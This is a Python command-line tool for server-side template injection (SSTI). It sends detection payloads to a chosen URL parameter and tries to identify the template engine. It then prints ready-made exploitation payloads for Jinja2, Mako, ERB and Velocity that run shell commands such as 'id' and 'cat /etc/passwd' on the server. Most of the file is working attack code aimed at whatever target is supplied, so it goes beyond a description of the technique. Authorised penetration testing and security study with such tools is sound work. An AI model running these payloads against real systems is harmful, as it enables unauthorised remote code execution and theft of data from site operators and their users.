#!/usr/bin/env python3
"""
SSTI Tester - Test Server-Side Template Injection vulnerabilities.

Usage:
    python ssti_tester.py <target_url> <parameter_name>

Example:
    python ssti_tester.py http://target.com/submit name
    python ssti_tester.py http://target.com/greet?user= user
"""

import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== Configuration =====
session = requests.Session()
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# session.proxies.update(proxies)
# session.verify = False

# SSTI Detection payloads - math operations that produce unique output
SSTI_PAYLOADS = [
    # Jinja2/Jinja
    ("{{ 7 * 7 }}", "49"),
    ("{{ 7 * 7 }}", "49"),
    ("${7*7}", "49"),  # Mako
    ("<%= 7 * 7 %>", "49"),  # ERB (Ruby)
    ("#{7*7}", "49"),  # Velocity
    ("[[ 7 * 7 ]]", "49"),  # Freemarker
    # Expression Language (Java EL)
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    # More Jinja2 (common in Python)
    ("{{ 2 + 2 }}", "4"),
    ("{{ 3 * 3 }}", "9"),
    ("{{ 10 - 5 }}", "5"),
    # Jinja2 filter/attribute access (detection)
    ("{{ ''.__class__ }}", "type"),
    ("{{ request.environ }}", "environ"),
    # Python expression
    ("{{ 'A' * 5 }}", "AAAAA"),
    ("{{ request.method }}", "GET"),
]

# HTTP method override for POST/GET
HTTP_METHODS = ["GET", "POST"]


def test_ssti(target_url, param_name, payload, method="GET"):
    """Test single SSTI payload"""
    try:
        if method == "GET":
            params = {param_name: payload}
            r = session.get(target_url, params=params, verify=False, timeout=5)
        else:
            data = {param_name: payload}
            r = session.post(target_url, data=data, verify=False, timeout=5)

        return r.status_code, r.text
    except Exception as e:
        return None, str(e)


def run_ssti_test(target_url, param_name):
    """Run SSTI detection test"""
    print(f"[*] SSTI Tester")
    print(f"[*] Target: {target_url}")
    print(f"[*] Parameter: {param_name}")
    print(f"[*] Testing {len(SSTI_PAYLOADS)} payloads...")
    print()

    found = False

    for i, (payload, expected) in enumerate(SSTI_PAYLOADS, 1):
        for method in HTTP_METHODS:
            status, response = test_ssti(target_url, param_name, payload, method)

            if status is None:
                continue

            # Check if expected value appears in response
            if expected in response:
                print(f"[+] VULNERABLE ({method}): {payload}")
                print(f"    Expected: {expected}")
                print(f"    Status: {status}")
                print(f"    Preview: {response[:300]}...")
                print()
                found = True

            time.sleep(0.05)

    if not found:
        print("[-] No obvious SSTI detected with standard payloads")
        print("[*] Try:")
        print("    - Different template syntax ({{ }}, ${ }, <% %>, etc.)")
        print("    - Testing error messages for template engine clues")
        print("    - Fuzzing with special characters: {{ $ } # % < >")


def identify_engine(target_url, param_name):
    """Try to identify template engine"""
    print("\n[*] Identifying template engine...")

    engine_tests = {
        "Jinja2": "{{ 7 * 7 }}",
        "Mako": "${7*7}",
        "ERB": "<%= 7 * 7 %>",
        "Velocity": "#set($x=7*7)$x",
        "FreeMarker": "<#assign x=7*7>${x}",
        "Twig": "{{ 7 * 7 }}",
    }

    for engine, payload in engine_tests.items():
        status, response = test_ssti(target_url, param_name, payload)

        if status and "49" in response:
            print(f"[+] Likely engine: {engine}")
            return engine

    print("[-] Could not identify engine")
    return None


# ===== Exploitation Examples =====
def generate_exploit_examples(engine):
    """Generate exploitation payloads for detected engine"""
    if not engine:
        return

    print(f"\n[*] Exploitation examples for {engine}:")

    exploits = {
        "Jinja2": [
            "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}",
            "{{ config.items() }}",  # Config disclosure
            "{% for c in [].__class__.__base__.__subclasses__() %}{% if 'Popen' in c.__name__ %}{{c('cat /etc/passwd',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}",
        ],
        "Mako": [
            "${subprocess.Popen('id',shell=True,stdout=subprocess.PIPE).stdout.read()}",
            "${''.join([c for c in ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__.values() if 'Popen' in str(c)])}",
        ],
        "ERB": [
            "<%= system('id') %>",
            "<%= `id` %>",
        ],
        "Velocity": [
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$rt.getRuntime().exec('id')",
        ],
    }

    for payload in exploits.get(engine, []):
        print(f"    - {payload[:80]}...")


# ===== Main =====
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python ssti_tester.py <target_url> <parameter_name>")
        print("\nExample:")
        print("  python ssti_tester.py http://target.com/greet user")
        print("  python ssti_tester.py http://target.com/mail email")
        sys.exit(1)

    target_url = sys.argv[1]
    param_name = sys.argv[2]

    run_ssti_test(target_url, param_name)
    engine = identify_engine(target_url, param_name)

    if engine:
        generate_exploit_examples(engine)

    print("\n[*] For more payloads, see:")
    print("    - PayloadsAllTheThings/SSTI")
    print("    - tplmap tool")
